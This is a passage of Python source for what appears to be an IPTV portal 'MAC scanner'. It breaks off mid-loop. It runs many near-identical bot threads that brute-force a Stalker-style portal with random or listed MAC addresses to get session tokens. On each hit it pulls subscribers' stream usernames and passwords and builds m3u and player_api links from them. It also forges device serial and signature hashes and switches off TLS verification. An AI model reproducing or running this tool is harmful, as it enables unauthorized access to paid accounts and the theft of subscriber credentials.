			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)



def d2():
	global hitc
	global hitr
	global tokenr
	for mac in range(2,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_02"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d3():
	global hitc
	global hitr
	global tokenr
	for mac in range(3,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_03"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)


def d4():
	global hitc
	global hitr
	global tokenr
	for mac in range(4,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_04"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d5():
	global hitc
	global hitr
	global tokenr
	for mac in range(5,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_05"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d6():
	global hitc
	global hitr
	global tokenr
	for mac in range(6,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_06"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d7():
	global hitc
	global hitr
	global tokenr
	for mac in range(7,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_07"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d8():
	global hitc
	global hitr
	global tokenr
	for mac in range(8,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_08"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
